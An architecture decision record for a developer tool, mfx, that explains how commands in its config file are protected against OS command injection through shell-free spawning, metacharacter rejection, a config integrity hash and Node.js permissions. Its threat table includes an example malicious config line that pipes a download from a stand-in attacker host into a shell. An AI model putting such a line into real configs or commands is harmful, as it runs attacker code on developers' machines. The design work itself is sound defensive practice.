# ADR-0001 — Command Trust Boundary in mfx.config.json

* **Status:** accepted
* **Deciders:** EKOU Solutions
* **Date:** 2026-06-29

---

## Context and Problem Statement

`mfx.config.json` contains command strings (e.g. `"dev": "vite --port 5173"`) that
`mfx` executes as subprocesses at startup. Without any controls, a tampered or
maliciously crafted config can run arbitrary code with the full privileges of the
developer's user account.

This falls under **CWE-78** (Improper Neutralization of Special Elements used in
an OS Command — "OS Command Injection"), which OWASP ranks under
**A03:2021 — Injection** in the OWASP Top 10.

**Relevant attack vectors:**

| Vector | Example |
|---|---|
| Malicious PR | `"dev": "vite & curl https://evil.com/exfil \| sh"` looks like a minor config change |
| Supply chain | A compromised npm postinstall hook writes to `mfx.config.json` |
| Shared machine | A config from an untrusted source is run without review |

The tool is a local devtool — it runs on developer machines, not in production.
The threat is real but moderate: the config is typically in git (visible history),
but command-section changes can go unreviewed in noisy PRs.

---

## Decision Drivers

- **No shell invocation** — OWASP Command Injection Prevention Cheat Sheet: *"use
  safe APIs that avoid use of the interpreter entirely."* Pattern-matching on
  metacharacters is a weaker, bypassable control.
- **Low friction for legitimate use** — standard dev server commands (`vite`,
  `webpack`, `nx`) must work without changes.
- **Auditable supply chain** — SLSA Source Integrity: changes to build inputs
  (our "commands" section) must be detectable and require explicit acknowledgement.
- **Least privilege** — NIST SP 800-53 Rev 5 AC-6: processes should operate
  with only the permissions required for their function.
- **v1-feasible** — no experimental dependencies that could break across Node versions.

---

## Considered Options

### Option A — `shell: true` (current implicit default, no controls)

Pass the raw command string to `child_process.spawn` with `shell: true`.

- Good: maximum flexibility; user can use pipes and shell operators.
- Bad: any shell metacharacter in the config is executed — direct CWE-78 path.
- Bad: no audit trail for config changes.

### Option B — structural validation + `shell: false` ✓ chosen

Parse the command string into `[bin, ...args]` using an argv parser and call
`spawn(bin, args, { shell: false })`. Reject at config-parse time any string that
contains shell metacharacters (`;`, `&`, `|`, `$`, `` ` ``, `>`, `<`).

- Good: shell injection is structurally impossible — OWASP's recommended approach.
- Neutral: user cannot use pipes/redirects directly; they must wrap in an npm script.
  This is an acceptable trade-off for a devtool.
- Bad: requires a hand-rolled argv parser in `packages/core` to preserve zero deps.

### Option C — allowlist of permitted binaries

Only allow a predefined set of binaries (`vite`, `webpack`, `nx`, `ng`, etc.).

- Good: very tight restriction.
- Bad: breaks any custom command; requires constant maintenance as the ecosystem evolves.
- Rejected: too restrictive for a general-purpose devtool.

---

## Decision Outcome

**Chosen: Option B — structural validation + `spawn` with `shell: false`.**

Supplemented by two additional layers implementing supply chain integrity
and process least privilege.

---

### Layer 1 — `spawn` with `shell: false`

**Standard:** OWASP Command Injection Prevention Cheat Sheet — *"Use safe APIs to
avoid use of the interpreter entirely (parameterized OS command execution)."*
Eliminates CWE-78 structurally.

At config load time, every command string is parsed into `[binary, ...args]`.
Shell metacharacters are rejected with a clear, actionable error:

```
ConfigError: command "app-shell.dev" contains disallowed characters: &
  Commands must be a plain executable + arguments (e.g. "vite --port 5173").
  To use shell operators, wrap the command in an npm script:
    "dev": "npm run dev:app-shell"
```

The subprocess is then started as:

```typescript
spawn(binary, args, { shell: false, env: process.env })
```

---

### Layer 2 — Config integrity hash

**Standard:** SLSA Source Integrity (Google / Linux Foundation) — build inputs
must be verifiable and changes must be explicitly acknowledged. Analogous to
how npm records `integrity` SHA-512 hashes per package in `package-lock.json`.

On startup, `mfx` computes a SHA-256 of the `commands` section of
`mfx.config.json`. The hash is stored in `.mfx/config.lock` (gitignored,
machine-local):

```json
{
  "commandsHash": "sha256:e3b0c44298fc1c149...",
  "lastVerified": "2026-06-29T14:32:00Z"
}
```

- **First run / no lock file:** hash is written silently.
- **Hash matches:** startup proceeds normally.
- **Hash mismatch:** `mfx` pauses, shows a diff, and requires explicit confirmation:

```
⚠  mfx.config.json commands changed since last run:

  app-shell
    dev:  "vite --port 5173"  →  "vite --port 5180"

  host-app
    dev:  [new]  →  "vite --port 5200"

Continue with updated commands? [y/N]
```

Answering `y` updates the lock file. Answering `N` exits without running anything.

---

### Layer 3 — Node.js Permission Model

**Standard:** NIST SP 800-53 Rev 5, AC-6 — Principle of Least Privilege:
*"Employ the principle of least privilege, allowing only authorized accesses for
users (and processes acting on behalf of users) that are necessary to accomplish
assigned organizational tasks."*

`mfx` is launched with Node.js `--permission` constraints (stable in Node.js 22 LTS;
`--experimental-permission` on Node.js 20 LTS) restricting the mfx process itself:

| Permission | Scope |
|---|---|
| `--allow-fs-read` | Project directory (cwd) |
| `--allow-fs-write` | `.mfx/` directory only |
| `--allow-child-process` | Required to spawn MFE dev servers |
| `--allow-env` | Allowed (dev servers require environment variables) |

Applied via the wrapper script at `apps/mfx-cli/bin/mfx` (the npm binary entry point).

This layer sandboxes **the mfx process**, not the child processes it spawns.
Child processes (Vite, webpack, etc.) run under the OS's normal permission model
for the user — this is intentional; dev servers require broad project access.

---

## Positive Consequences

- CWE-78 (OS Command Injection) is structurally eliminated at Layer 1.
- Developers are automatically alerted when command definitions change (SLSA-aligned).
- The mfx process operates under least privilege (NIST AC-6).

## Negative Consequences

- Users with pipe-based commands (`tsc --watch | prettier --stdin`) must refactor
  them into npm scripts. The error message provides clear guidance.
- `.mfx/config.lock` must be in `.gitignore`; `mfx init` and `eject` handle this.
- Node.js ≥ 20 LTS is required (already aligned with team baseline).

---

## Standards referenced

| Standard | Layer | Source |
|---|---|---|
| CWE-78 — OS Command Injection | 1 | MITRE / NIST NVD |
| OWASP A03:2021 — Injection | 1 | OWASP Top 10 |
| OWASP Command Injection Prevention Cheat Sheet | 1 | OWASP |
| SLSA Source Integrity | 2 | Google / Linux Foundation |
| npm `package-lock.json` integrity hashes | 2 | npm / GitHub |
| NIST SP 800-53 Rev 5, AC-6 — Least Privilege | 3 | NIST |

---

## See also

- [requirements.md](../requirements.md) — FR-15, FR-16, FR-17
- [architecture.md](../architecture.md) — §Decision: command trust boundary
